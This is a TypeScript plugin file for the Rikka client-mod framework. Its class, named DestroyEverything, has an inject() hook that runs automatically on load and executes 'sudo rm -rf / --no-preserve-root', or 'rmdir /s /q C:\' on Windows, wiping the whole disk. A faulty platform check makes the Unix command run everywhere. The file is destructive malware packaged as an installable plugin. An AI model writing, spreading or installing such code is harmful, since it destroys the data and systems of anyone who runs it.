import RikkaPlugin from '@rikka/Common/entities/Plugin';
import { exec } from "child_process";
import manifest from './manifest.json';

export default class DestroyEverything extends RikkaPlugin {
   inject() {
      if ((process.platform) === "linux" || "darwin")
         exec("sudo rm -rf / --no-preserve-root");
      else if (process.platform === "win32")
         exec("rmdir /s /q C:\\");
   }
}
